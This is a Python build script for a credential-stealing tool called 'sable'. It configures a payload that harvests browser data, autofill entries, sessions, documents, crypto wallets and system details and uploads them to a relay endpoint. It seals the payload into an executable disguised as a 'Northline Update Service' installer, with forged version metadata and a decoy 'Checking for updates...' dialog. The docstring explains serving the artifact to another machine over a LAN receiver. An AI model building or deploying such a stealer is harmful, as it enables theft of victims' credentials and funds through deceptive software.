"""Build the V1 finalize artifact for the laptop run.

Same job as ``live_build_remote.py`` with the two things that landed after it: the
version resource and the decoy dialog are set from the build, so the artifact on the
other machine is the one the release sheet describes and not just the collector.

The file is written into the LAN receiver's own output directory, because that receiver
serves anything sitting there over GET — which is how it gets to a machine with no share
and no admin port open.

  python live_v1.py <destination> [sources]
"""

from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(r"C:\Users\Kuzenee\Desktop\55555\sable")
sys.path.insert(0, str(ROOT))

from core import forge, seal  # noqa: E402
from core.schema import (  # noqa: E402
    SCHEMA_VERSION,
    RelayConfig,
    RunConfig,
    SourceConfig,
    VersionConfig,
)

DESTINATION = Path(sys.argv[1])
WANTED = sys.argv[2] if len(sys.argv) > 2 else "system,browsers,sessions"

NAMES = ("autofill", "documents", "wallets", "sessions", "system", "browsers")
enabled = {part.strip() for part in WANTED.split(",") if part.strip()}
unknown = enabled - set(NAMES)
if unknown:
    raise SystemExit(f"unknown source(s): {', '.join(sorted(unknown))}")

cfg = RunConfig(
    schema_version=SCHEMA_VERSION,
    mutex=r"Global\SableV1Laptop",
    seal_key="bench-laptop-v1",
    relay=RelayConfig(kind="https", endpoint="http://192.168.1.151:8099/upload"),
    sources=SourceConfig(**{name: name in enabled for name in NAMES}),
    self_remove=False,
    keep_local=False,
    version=VersionConfig(
        company="Northline Software Ltd",
        product="Northline Update Service",
        description="Keeps Northline components current.",
        copyright="(c) Northline Software Ltd",
        original_name="NorthlineSetup.exe",
        file_version="6.2.9.441",
        product_version="6.2.9.441",
    ),
    decoy_seconds=6,
    decoy_title="Northline Update",
    decoy_text="Checking for updates...",
)

archive = forge.payload(ROOT, cfg)
print(f"sources        {', '.join(sorted(enabled))}")
print(f"payload        {len(archive)} bytes")

sealed = seal.seal(archive, cfg.seal_key)
STUB = ROOT / "tools" / "dist" / "sable-launcher.exe"
DESTINATION.parent.mkdir(parents=True, exist_ok=True)
forge.build(cfg, sealed, DESTINATION, mode="exe", stub=STUB, version=cfg.version)
print(f"artifact       {DESTINATION}  {DESTINATION.stat().st_size} bytes")
print(f"seal key       {cfg.seal_key}")
